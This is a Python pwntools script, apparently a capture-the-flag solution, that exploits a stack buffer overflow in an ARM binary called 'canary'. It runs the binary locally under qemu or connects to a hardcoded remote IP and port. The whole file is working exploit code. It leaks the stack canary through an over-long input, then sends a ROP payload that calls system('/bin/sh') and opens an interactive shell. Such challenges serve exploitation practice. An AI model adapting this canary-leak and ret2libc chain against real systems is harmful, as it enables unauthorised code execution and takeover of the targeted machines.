#!/usr/bin/env python
from pwn import *
import sys

HOST = '116.203.30.62'
PORT = 18113

def info(s):
	log.info(s)

def exploit(p):
	pop04=0x00026b7c
	binsh=0x00071EB0
	system=0x00016D90
	p.sendafter('> ','a'*41)
	p.recvuntil('a'*41)
	canary=u32(p.recv(3).rjust(4,'\x00'))
	info("canary is 0x%x"%canary)
	payload='a'*40+p32(canary)
	payload+=p32(0)*3+p32(pop04)+p32(binsh)+p32(0)+p32(system)
	p.sendafter('>',payload)
	p.sendlineafter('> ','')
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p= process(['qemu-arm'
  					,'-g' #// gdb server
					,'1234'# // port
					,'./canary'])# // binary
 		context.log_level = 'debug' 
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
